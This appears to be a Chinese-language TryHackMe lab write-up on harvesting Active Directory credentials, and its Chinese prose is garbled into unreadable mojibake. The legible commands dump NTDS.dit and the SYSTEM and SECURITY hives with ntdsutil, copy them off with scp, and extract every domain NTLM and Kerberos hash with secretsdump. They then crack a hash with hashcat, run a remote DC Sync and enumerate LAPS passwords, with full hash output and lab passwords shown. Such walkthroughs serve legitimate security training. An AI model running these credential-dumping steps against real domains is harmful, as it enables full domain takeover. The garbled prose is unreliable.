NTDSæ•°æ®åº“åœ¨Windowsè®¡ç®—æœºä¸­çš„é»˜è®¤è·¯å¾„ä¸ºC:\\Windows\\NTDSï¼Œè€Œä¸”è¯¥æ•°æ®åº“ä¼šç»è¿‡åŠ å¯†å¤„ç†ä»¥é˜²æ­¢æ”»å‡»è€…ç›´æ¥ä»ç›®æ ‡è®¡ç®—æœºä¸­æå–æ•°æ®ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·ä¸è¢«å…è®¸ä»æ­£åœ¨è¿è¡Œçš„è®¡ç®—æœºä¸Šç›´æ¥è®¿é—®NTDS.ditæ•°æ®åº“æ–‡ä»¶ï¼Œå› ä¸ºè¯¥æ–‡ä»¶å°†ç”±ç›¸å…³çš„Active Directoryä½¿ç”¨å¹¶ä¼šè¢«é”å®šã€‚ ç„¶è€Œï¼Œæ”»å‡»è€…ä»ç„¶æœ‰å„ç§æ–¹æ³•å¯ä»¥è®¿é—®ç›®æ ‡è®¡ç®—æœºä¸­çš„NTDS.ditæ•°æ®åº“æ–‡ä»¶ã€‚æœ¬å°èŠ‚å°†è®¨è®ºå¦‚ä½•ä½¿ç”¨ntdsutilå’ŒDiskshadowå·¥å…·æ¥è·å¾—NTDSæ–‡ä»¶çš„å‰¯æœ¬ï¼Œä»¥åŠå¦‚ä½•è½¬å‚¨è¯¥æ–‡ä»¶æ‰€åŒ…å«çš„å†…å®¹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è§£å¯†NTDSæ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªç³»ç»Ÿå¼•å¯¼å¯†é’¥æ¥å°è¯•è§£å¯†ç”±LSAæ‰€éš”ç¦»çš„å‡­æ®ï¼Œè¯¥å‡­æ®å­˜å‚¨åœ¨SECURITYæ–‡ä»¶ç³»ç»Ÿä¸­ï¼›å› æ­¤ï¼Œæˆ‘ä»¬è¿˜å¿…é¡»è½¬å‚¨åŒ…å«æ‰€æœ‰éœ€è¦è§£å¯†çš„æ–‡ä»¶çš„securityæ–‡ä»¶ã€‚ Ntdsutilä»‹ç» Ntdsutilæ˜¯ä¸€ä¸ªWindowså®ç”¨ç¨‹åºï¼Œä¸»è¦ç”¨äºç®¡ç†å’Œç»´æŠ¤Active Directoryé…ç½®ï¼Œå®ƒå¯ä»¥åœ¨å„ç§åœºæ™¯ä¸­ä½¿ç”¨ï¼Œä¾‹å¦‚ï¼š æ¢å¤æ´»åŠ¨ç›®å½•(Active Directory)ä¸­å·²åˆ é™¤çš„å¯¹è±¡ã€‚ æ‰§è¡Œé’ˆå¯¹ADæ•°æ®åº“çš„ç»´æŠ¤æªæ–½ã€‚ æ´»åŠ¨ç›®å½•(Active Directory)å¿«ç…§ç®¡ç†ã€‚ è®¾ç½®ç›®å½•æœåŠ¡è¿˜åŸæ¨¡å¼(DSRM-Directory Services Restore Mode)çš„ç®¡ç†å‘˜å¯†ç ã€‚ æœ‰å…³Ntdsutilçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®Microsoftçš„ç›¸å…³å®˜æ–¹æ–‡æ¡£é¡µé¢ã€‚ æœ¬åœ°è½¬å‚¨(æ”»å‡»è€…æ— å‡­æ®) å¦‚æœæˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…æ²¡æœ‰å¯ç”¨çš„å‡­æ®ï¼Œä½†æ˜¯æ‹¥æœ‰å¯¹ç›®æ ‡åŸŸæ§åˆ¶å™¨(DC)çš„ç®¡ç†å‘˜è®¿é—®æƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šå¸¸å¯ä»¥å°è¯•æ‰§è¡Œæœ¬åœ°è½¬å‚¨æ“ä½œã€‚æˆ‘ä»¬å°†ä¾é Windowså®ç”¨ç¨‹åºæ¥è½¬å‚¨NTDSæ–‡ä»¶å¹¶ç¦»çº¿ç ´è§£å®ƒä»¬ã€‚é¦–å…ˆï¼Œå‡è®¾åœ¨æœ¬æ¬¡å®éªŒä¸­æˆ‘ä»¬å…·æœ‰å¯¹ç›®æ ‡åŸŸæ§åˆ¶å™¨çš„ç®¡ç†å‘˜è®¿é—®æƒé™ã€‚ è¦æˆåŠŸè½¬å‚¨NTDSæ–‡ä»¶çš„å†…å®¹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨ç›®æ ‡åŸŸæ§åˆ¶å™¨ä¸­è·å–ä»¥ä¸‹æ–‡ä»¶ï¼š C:\\Windows\\NTDS tds.dit C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY ä¸‹é¢æ˜¯ä¸€è¡ŒPowerShellå‘½ä»¤ï¼Œä½œç”¨æ˜¯ä½¿ç”¨Ntdsutilå·¥å…·å°†NTDSæ–‡ä»¶è½¬å‚¨åˆ°ç›®æ ‡æœºå™¨ä¸­çš„C:\\tempç›®å½•ä¸‹ã€‚ #ä»å—å®³æœºå™¨(ç›®æ ‡DCæœºå™¨)ä¸­è½¬å‚¨NTDSæ–‡ä»¶çš„å†…å®¹ #é€šè¿‡RDPæˆ–è€…ç›´æ¥è®¿é—®Tryhackmeæ‰€æä¾›çš„æµè§ˆå™¨é¡µé¢æ¥æ“ä½œç›®æ ‡æœºå™¨ï¼Œä»¥ç®¡ç†å‘˜ç”¨æˆ·èº«ä»½åœ¨ç›®æ ‡æœºä¸Šå¯åŠ¨cmd.exeå¹¶æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ C:\\Users\\thm&gt; powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\" #åœ¨å‘½ä»¤æç¤ºç¬¦ç•Œé¢ä¸‹è°ƒç”¨ntdsutil.exeå·¥å…·,å¯¼å‡ºActive DirectoryåŸŸæ§åˆ¶å™¨çš„NTDS.ditæ•°æ®åº“å¤‡ä»½æ–‡ä»¶ã€‚ #å…·ä½“åˆ†æå¦‚ä¸‹: #ntdsutil.exe:ntdsutil.exeæ˜¯Windowsä¸­çš„ä¸€ä¸ªå·¥å…·ï¼Œå¯ç”¨äºç®¡ç†Active Directoryæ•°æ®åº“ã€‚ #'ac i ntds':è¿™æ˜¯ntdsutil.exeå·¥å…·ä¸­çš„å‘½ä»¤ï¼Œç”¨äºè¿æ¥Active Directoryã€‚ #'ifm':è¿›å…¥æ§åˆ¶å°äº¤äº’ç•Œé¢ã€‚ #'create full c:\\temp':æ‰§è¡Œå¤‡ä»½æ“ä½œï¼Œåˆ›å»ºå®Œæ•´çš„NTDS.ditæ•°æ®åº“çš„å‰¯æœ¬æ–‡ä»¶åˆ°c:\\tempç›®å½•ä¸‹ã€‚ #q q:é€€å‡ºntdsutil.exeå·¥å…·ã€‚ ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬æ£€æŸ¥ç›®æ ‡æœºå™¨ä¸­çš„c:\\tempç›®å½•ï¼Œæˆ‘ä»¬å°†ä¼šçœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼šActive Directoryå’Œregistryï¼Œå…¶ä¸­åŒ…å«äº†æˆ‘ä»¬æ‰€éœ€è¦çš„ä¸‰ä¸ªæ–‡ä»¶ã€‚ æˆ‘ä»¬å¯ä»¥å°†æ‰€éœ€çš„ä¸Šè¿°ä¸‰ä¸ªæ–‡ä»¶ä¼ è¾“åˆ°æˆ‘ä»¬çš„æ”»å‡»æœºä¸­ï¼Œç„¶åå†è¿è¡Œsecretsdump.pyè„šæœ¬ä»æˆ‘ä»¬æ‰€è½¬å‚¨çš„å†…å­˜æ–‡ä»¶ä¸­æå–å¯†ç å“ˆå¸Œå€¼ã€‚ #åœ¨æ”»å‡»æœºä¸Šé’ˆå¯¹ç›®æ ‡æœºä½¿ç”¨SCPå‘½ä»¤å®Œæˆæ–‡ä»¶ä¼ è¾“ï¼Œå…¶ä¸­è¿œç¨‹ç›®æ ‡æœºåœ¨ä»¥ä¸‹å‘½ä»¤ä¸­çš„è¡¨ç¤ºæ ¼å¼ä¸ºTHM\\\\thm@MACHINE_IPæˆ–è€…THM.red\\\\thm@MACHINE_IP #åœ¨ä½¿ç”¨SCPå‘½ä»¤å¤„ç†å¸¦ç©ºæ ¼çš„æ–‡ä»¶è·¯å¾„æ—¶è¦åœ¨ç©ºæ ¼å‰é¢å¤–æ·»åŠ â€œ\\\\\\â€ã€‚ scp THM\\\\thm@10.10.63.254:C:/temp/registry/SECURITY /tmp/ scp THM\\\\thm@10.10.63.254:C:/temp/registry/SYSTEM /tmp/ scp THM\\\\thm@10.10.63.254:c:/temp/Active\\\\\\ Directory/ntds.dit /tmp/ #Passwordï¼šPassw0rd! #åœ¨æ”»å‡»æœºä¸Šä»æœ¬åœ°NTDSæ–‡ä»¶ä¸­æå–å“ˆå¸Œå€¼ python3 /impacket/examples/secretsdump.py -sam /tmp/SECURITY -system /tmp/SYSTEM -ntds /tmp/ntds.dit local python3 ./impacket/examples/secretsdump.py -sam /tmp/SECURITY -system /tmp/SYSTEM -ntds /tmp/ntds.dit local Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) [-] SAM hashes extraction failed: 'NoneType' object is not subscriptable [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c [*] Reading and decrypting hashes from /tmp/ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:18d4f9b55f0e4cf0aa9d57998433b7f2::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: thm.red\\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889::: thm.red\\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207::: thm.red\\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666::: [*] Kerberos keys from /tmp/ntds.dit Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30 Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0 Administrator:des-cbc-md5:6d34e608f8574632 CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:26cde2aa6599210f99ebbde586d7c21c9181248298bc4648fb773ecd1b0f057b CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:6e1ab8804fac1ef56fc9761c1b1ddd62 CREDS-HARVESTIN$:des-cbc-md5:860ed037c4467a13 krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3 krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c krbtgt:des-cbc-md5:d92ffd4abf02b049 thm.red\\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca thm.red\\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c thm.red\\thm:des-cbc-md5:794f3889e646e383 thm.red\\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac thm.red\\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529 thm.red\\victim:des-cbc-md5:457cdc673d3b0d85 thm.red\\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26 thm.red\\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf thm.red\\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4 thm.red\\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f thm.red\\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6 thm.red\\admin:des-cbc-md5:32a8a201d3080b2f thm.red\\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d thm.red\\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d thm.red\\svc-thm:des-cbc-md5:f8e57c49f7dc671c thm.red\\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e thm.red\\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546 thm.red\\bk-admin:des-cbc-md5:108cc2b0d3100767 thm.red\\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660 thm.red\\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64 thm.red\\test-user:des-cbc-md5:aec8e3325b85316b sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242 sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f sshd:des-cbc-md5:b58f850b4c082cc7 [*] Cleaning up... ç›®æ ‡ç³»ç»Ÿçš„å¼•å¯¼å¯†é’¥å€¼ä¸ºï¼š0x36c8d26ec0df8b23ce63bcefa6e2d821 bk-adminç”¨æˆ·çš„NTLMå¯†ç å“ˆå¸Œå€¼ä¸ºï¼šthm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: æˆ‘ä»¬å¯ä»¥ä½¿ç”¨hashcatå¯¹bk-adminç”¨æˆ·çš„å¯†ç å“ˆå¸Œè¿›è¡Œè§£å¯†ï¼š root@hekeats$ nano hash.txt #thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: root@hekeats$ hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/passwords/rockyou.txt bk-adminç”¨æˆ·çš„å¯†ç æ˜æ–‡ä¸ºï¼šPassw0rd123 è¿œç¨‹è½¬å‚¨(æ”»å‡»è€…æœ‰å‡­æ®) æˆ‘ä»¬åˆšæ‰è®¨è®ºäº†å¦‚ä½•åœ¨æ²¡æœ‰å‡­æ®çš„æƒ…å†µä¸‹ä»ç›®æ ‡DCçš„å†…å­˜ä¸­è·å–å“ˆå¸Œï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†å±•ç¤ºå¦‚ä½•è¿œç¨‹è½¬å‚¨ç›®æ ‡ç³»ç»Ÿå’ŒåŸŸæ§åˆ¶å™¨ä¸­çš„å“ˆå¸Œå€¼ï¼Œè¿™éœ€è¦æˆ‘ä»¬æ‹¥æœ‰ç›¸å…³å‡­æ®ï¼Œä¾‹å¦‚å¯†ç æˆ–NTLMå“ˆå¸Œå€¼ã€‚æˆ‘ä»¬è¿˜éœ€è¦æ‹¥æœ‰å¯¹ç›®æ ‡åŸŸæ§åˆ¶å™¨å…·æœ‰ç®¡ç†åŠè®¿é—®æƒé™çš„ç”¨æˆ·æˆ–è€…ä½¿ç”¨ä¸‹æ–‡çš„DC Syncéƒ¨åˆ†å†…å®¹ä¸­æ‰€è®¨è®ºçš„å…·æœ‰ç‰¹æ®Šæƒé™çš„å‡­æ®ã€‚ DC Sync(DCåŒæ­¥) DC Syncæ˜¯æ”»å‡»è€…ä¼šåœ¨Active Directoryç¯å¢ƒä¸­æ‰§è¡Œçš„ä¸€ç§å¸¸ç”¨æ”»å‡»æ–¹å¼ï¼Œç›®çš„æ˜¯è¿œç¨‹è½¬å‚¨å‡­æ®ã€‚å½“æ”»å‡»è€…è·å¾—å…·æœ‰ä»¥ä¸‹ADæƒé™çš„å¸æˆ·(å…·æœ‰å¿…è¦æƒé™çš„ç‰¹æ®Šå¸æˆ·)æˆ–è€…ç›®æ ‡ç½‘ç»œç¯å¢ƒä¸­çš„AD adminå¸æˆ·è¢«æ”»ç ´æ—¶ï¼Œæ­¤ç±»æ”»å‡»å°±å¯èƒ½ä¼šå‘ç”Ÿï¼š Replicating Directory Changes Replicating Directory Changes All Replicating Directory Changes in Filtered Set æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ä¸Šè¿°è¿™äº›ADé…ç½®æ¥æ‰§è¡ŒåŸŸå¤åˆ¶ï¼Œé€šå¸¸ä¹Ÿè¢«ç§°ä¸ºâ€œDC Syncâ€æˆ–åŸŸæ§åˆ¶å™¨åŒæ­¥ã€‚æœ‰å…³DC Syncæ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥å°è¯•è®¿é—®ä»¥ä¸‹åšå®¢å†…å®¹ï¼š ã€THMã€‘Persisting Active Directory(ADåŸŸæƒé™ç»´æŒ)-çº¢é˜Ÿ æ»¥ç”¨DCSyncä»‹ç»-çŸ¥ä¹ æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨Impacket SecretsDumpè„šæœ¬å·¥å…·æ¥æ¼”ç¤ºDCåŒæ­¥æ”»å‡»ï¼š #åœ¨æ”»å‡»æœºä¸Šé’ˆå¯¹ç›®æ ‡DCæ‰§è¡ŒåŸŸæ§åˆ¶å™¨åŒæ­¥æ”»å‡» #æ³¨æ„ï¼šè¯·ä½¿ç”¨`THM.red/thm`ä½œä¸ºä¸æœ¬å°èŠ‚ç»ƒä¹ ç›¸å…³çš„Active Directoryç”¨æˆ·ï¼Œå› ä¸ºè¯¥ç”¨æˆ·å…·æœ‰ç®¡ç†å‘˜æƒé™ã€‚ python3 /opt/impacket/examples/secretsdump.py -just-dc THM.red/&lt;AD_Admin_User&gt;@MACHINE_IP python3 /opt/impacket/examples/secretsdump.py -just-dc THM.red/thm@10.10.63.254 #Passwordï¼šPassw0rd! è®©æˆ‘ä»¬è¿›ä¸€æ­¥è§£é‡Šä¸€ä¸‹ä¸Šè¿°å‘½ä»¤ï¼š -just-dc å‘½ä»¤å‚æ•°ç”¨äºæŒ‡å®šæå–ç›®æ ‡DCä¸­çš„NTDSæ–‡ä»¶ã€‚ thm.red/AD_Admin_User å‘½ä»¤å‚æ•°æ˜¯ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·(æ ¼å¼ä¸ºdomain/user)ã€‚ æ³¨æ„ï¼Œå¦‚æœæˆ‘ä»¬åªæƒ³è½¬å‚¨ç›®æ ‡DCä¸­æ‰€å­˜å‚¨çš„NTLMå¯†ç å“ˆå¸Œå€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨-just-dc-ntlmå‚æ•°æ¥æŒ‡å®šï¼Œå‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š #æ‰§è¡ŒDC Syncæ”»å‡»ä»¥è½¬å‚¨NTLMå¯†ç å“ˆå¸Œ #æ³¨æ„ï¼šè¯·ä½¿ç”¨`THM.red/thm`ä½œä¸ºä¸æœ¬å°èŠ‚ç»ƒä¹ ç›¸å…³çš„Active Directoryç”¨æˆ·ï¼Œå› ä¸ºè¯¥ç”¨æˆ·å…·æœ‰ç®¡ç†å‘˜æƒé™ã€‚ python3 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/&lt;AD_Admin_User&gt;@MACHINE_IP python3 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/thm@10.10.63.254 #Passwordï¼šPassw0rd! å½“æˆ‘ä»¬è·å–åˆ°ç›®æ ‡ç”¨æˆ·çš„NTLMå“ˆå¸Œä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥åŸºäºå·²è·å–çš„NTLMå“ˆå¸Œæ¥æ¨¡æ‹Ÿç›¸å…³çš„ç‰¹å®šç”¨æˆ·èº«ä»½æˆ–è€…ä½¿ç”¨ç±»ä¼¼äºhashcatçš„ç ´è§£å·¥å…·æ¥ç ´è§£å“ˆå¸Œå€¼ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨-m 1000æ¨¡å¼æ¥ç ´è§£Windows NTLMå“ˆå¸Œï¼š #å…ˆå°†è¦ç ´è§£çš„å¯†ç å“ˆå¸Œå€¼å­˜å‚¨åˆ°hash.txtæ–‡ä»¶ä¸­ hashcat -m 1000 -a 0 hash.txt /path/to/wordlist/passwords/rockyou.txt 0x08 LAPS(æœ¬åœ°ç®¡ç†å‘˜å¯†ç è§£å†³æ–¹æ¡ˆ) æœ¬å°èŠ‚å°†è®¨è®ºå¦‚ä½•åœ¨å·²ç»é…ç½®å¹¶å¯ç”¨äº†LAPS(æœ¬åœ°ç®¡ç†å‘˜å¯†ç è§£å†³æ–¹æ¡ˆ)åŠŸèƒ½çš„Active Directoryç¯å¢ƒä¸­æšä¸¾å’Œè·å–ç›®æ ‡æœºçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚ ç»„ç­–ç•¥é¦–é€‰é¡¹(GPP) Windowsæ“ä½œç³»ç»Ÿæœ‰å†…ç½®ç®¡ç†å‘˜(built-in Administrator)å¸æˆ·ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å¯†ç å¯¹å…¶è¿›è¡Œè®¿é—®ã€‚å¯¹äºæ”»å‡»è€…è€Œè¨€ï¼Œåœ¨å…·æœ‰è®¸å¤šè®¡ç®—æœºçš„å¤§å‹Windowsç¯å¢ƒä¸­æ›´æ”¹å¯†ç æ›´åŠ æœ‰æŒ‘æˆ˜æ€§ï¼Œå› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•åŸºäºMicrosoftå®ç°ä¸€ç§ä½¿ç”¨ç»„ç­–ç•¥é¦–é€‰é¡¹(GPP)æ¥è·¨å·¥ä½œç«™æ›´æ”¹æœ¬åœ°ç®¡ç†å‘˜å¸æˆ·çš„æ–¹æ³•ã€‚ GPP(ç»„ç­–ç•¥é¦–é€‰é¡¹)æ˜¯ä¸€ç§å…è®¸ç®¡ç†å‘˜åˆ›å»ºå…·æœ‰åµŒå…¥å¼å‡­æ®çš„åŸŸç­–ç•¥çš„å·¥å…·ã€‚ä¸€æ—¦éƒ¨ç½²äº†GPPï¼Œå°±ä¼šåœ¨ç›®æ ‡æœºå™¨çš„SYSVOLæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸åŒçš„XMLæ–‡ä»¶ï¼ŒSYSVOLæ˜¯Active Directoryçš„ä¸€ä¸ªé‡è¦ç»„ä»¶ï¼Œå®ƒå¯ä»¥åœ¨NTFSå·ä¸Šåˆ›å»ºä¸€ä¸ªå…±äº«ç›®å½•ï¼Œæ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·éƒ½èƒ½å¤Ÿä»¥å¯è¯»æƒé™æ¥è®¿é—®è¯¥å…±äº«ç›®å½•ã€‚ ä¸GPPç›¸å…³çš„XMLæ–‡ä»¶è¿˜å°†åŒ…å«ä¸€ä¸ªä½¿ç”¨AES-256ä½åŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†å¤„ç†çš„å¯†ç ï¼Œè¿™ç§åŠ å¯†æŠ€æœ¯è¶³å¤Ÿå¥½ï¼Œç›´åˆ°å¾®è½¯å®˜æ–¹ä»¥æŸç§æ–¹å¼åœ¨MSDNä¸Šå…¬å¸ƒäº†å®ƒçš„ç§é’¥ã€‚ç”±äºåŸŸç”¨æˆ·å¯ä»¥è¯»å–SYSVOLæ–‡ä»¶å¤¹çš„å†…å®¹ï¼Œå› æ­¤æ”»å‡»è€…å¯¹è¯¥æ–‡ä»¶å¤¹ä¸­æ‰€å­˜å‚¨çš„å¯†ç è¿›è¡Œè§£å¯†å˜å¾—å¾ˆå®¹æ˜“ã€‚ tipsï¼šç ´è§£SYSVOLçš„åŠ å¯†å¯†ç çš„å·¥å…·ä¹‹ä¸€æ˜¯Get-GPPPasswordè„šæœ¬ã€‚ æœ¬åœ°ç®¡ç†å‘˜å¯†ç è§£å†³æ–¹æ¡ˆ(LAPS)ä»‹ç» åœ¨2015å¹´ï¼Œå¾®è½¯åˆ é™¤äº†Windowsè®¡ç®—æœºåœ¨SYSVOLæ–‡ä»¶å¤¹ä¸­å­˜å‚¨åŠ å¯†å¯†ç çš„åŠŸèƒ½ï¼Œå¼•å…¥äº†æœ¬åœ°ç®¡ç†å‘˜å¯†ç è§£å†³æ–¹æ¡ˆ(LAPS)ï¼ŒLAPSèƒ½å¤Ÿæä¾›ä¸€ç§æ›´å®‰å…¨çš„æ–¹æ³•æ¥è¿œç¨‹ç®¡ç†Windowsæœºå™¨ä¸Šçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚ LAPSæ–¹æ³•å°†åœ¨ADç¯å¢ƒä¸­åŒ…å«è®¡ç®—æœºå¯¹è±¡çš„ä¸¤ä¸ªæ–°å±æ€§(ms-mcs-AdmPwdå’Œms-mcs-AdmPwdExpirationTime)ï¼Œå…¶ä¸­ms-mcs-AdmPwdå±æ€§åŒ…å«æœ¬åœ°ç®¡ç†å‘˜çš„æ˜æ–‡å¯†ç ï¼Œè€Œms-mcs-AdmPwdExpirationTimeå±æ€§åˆ™åŒ…å«å¯†ç è¿‡æœŸæ—¶é—´ã€‚ tipsï¼šLAPSå°†ä½¿ç”¨admpwd.dllä¿®æ”¹æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œå¹¶ä¼šæ›´æ–°ç›¸å…³çš„ms-mcs-AdmPwdçš„å€¼ã€‚ æšä¸¾LAPS é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ç›®æ ‡è®¡ç®—æœºä¸­æ˜¯å¦å®‰è£…äº†LAPSï¼Œè¿™å¯ä»¥é€šè¿‡æ£€æŸ¥admpwd.dllè·¯å¾„æ¥å®Œæˆ(æŸ¥çœ‹AdmPwd.dllæ–‡ä»¶æ˜¯å¦å­˜åœ¨)ï¼š C:\\Users\\thm&gt;dir \"C:\\Program Files\\LAPS\\CSE\" Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of C:\\Program Files\\LAPS\\CSE 06/06/2022 01:01 PM &lt;DIR&gt; . 06/06/2022 01:01 PM &lt;DIR&gt; .. 05/05/2021 07:04 AM 184,232 AdmPwd.dll 1 File(s) 184,232 bytes 2 Dir(s) 10,342,387,712 bytes free ä¸Šè¿°çš„è¾“å‡ºç»“æœèƒ½å¤Ÿç¡®è®¤ç›®æ ‡æœºå™¨ä¸Šæœ‰LAPSï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ£€æŸ¥AdmPwd cmdletçš„å¯ç”¨å‘½ä»¤ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š #åˆ—å‡ºå¯ç”¨äºæšä¸¾LAPSçš„PowerShell cmdlet #powershell -ex bypass PS C:\\Users\\thm&gt; Get-Command *AdmPwd* CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PS Cmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å“ªä¸ªADç»„ç»‡å•å…ƒ(OU)å…·æœ‰å¤„ç†LAPSçš„â€œæ‰€æœ‰æ‰©å±•æƒé™â€å±æ€§ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨â€œFind-AdmPwdExtendedRightsâ€cmdletå¹¶é™„åŠ æˆ‘ä»¬æ‰€éœ€è¦æ£€æŸ¥çš„ç»„ç»‡å•å…ƒ(OU)ã€‚ æ³¨æ„ï¼šè·å–å¯ç”¨OUå¯ä»¥åœ¨æˆ‘ä»¬æ‰§è¡Œæšä¸¾æ­¥éª¤æ—¶å®Œæˆï¼Œæœ¬ä¾‹ä¸­çš„ç›®æ ‡OUæ˜¯THMorgï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨-Identity *å‚æ•°æ¥åˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„OUã€‚ #æŸ¥æ‰¾å…·æœ‰AdmPwdExtendedRightså±æ€§çš„ç”¨æˆ· PS C:\\Users\\thm&gt; Find-AdmPwdExtendedRights -Identity THMorg ObjectDN ExtendedRightHolders -------- -------------------- OU=THMorg,DC=thm,DC=red {THM\\LAPsReader} 